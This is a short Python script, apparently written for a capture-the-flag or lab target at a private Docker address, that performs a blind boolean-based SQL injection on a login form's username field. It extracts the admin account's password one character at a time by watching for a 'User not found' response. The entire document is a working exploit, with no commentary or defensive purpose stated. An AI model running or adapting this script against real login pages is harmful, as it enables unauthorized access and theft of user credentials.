from requests import post
from string import printable

PASSWORD = ""

while True:
	for c in printable.replace("%","").replace("'","").replace("*",""):
		rq = post("http://172.17.0.3:1337/login", data={"username":	"' OR 1=1 and (SELECT count(username) FROM users WHERE grade='admin' and substr(password,"+str(len(PASSWORD)+1)+",1)='"+c+"')=1 -- -", "passwd": "b"})
		
		if "User not found" not in rq.text:
			PASSWORD+=c
			print(PASSWORD)
			break
	else:
		break
